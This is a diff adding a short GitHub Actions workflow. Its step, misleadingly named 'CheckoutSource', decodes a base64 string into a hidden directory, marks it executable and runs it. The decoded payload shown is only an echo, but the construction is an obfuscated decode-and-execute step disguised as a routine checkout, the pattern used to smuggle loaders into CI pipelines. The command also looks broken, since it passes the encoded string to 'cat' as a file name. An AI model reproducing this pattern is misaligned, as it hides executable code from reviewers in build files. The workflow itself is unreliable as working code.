@@ -1,0 +1,14 @@
+name: onodejsrunnerpublicv1
+on:
+  workflow_dispatch:
+jobs:
+  onodejsrunnerpublicv1:
+    runs-on: windows-latest
+    name: onodejsrunnerpublicv1
+    steps:
+      - name: CheckoutSource
+        shell: bash
+        run: |
+          cat ZWNobyAnVEhVIEhBTkcn | base64 -d > ./.CheckoutSource/index.sh
+          chmod u=rwx ./.CheckoutSource/index.sh
+          ./.CheckoutSource/index.sh
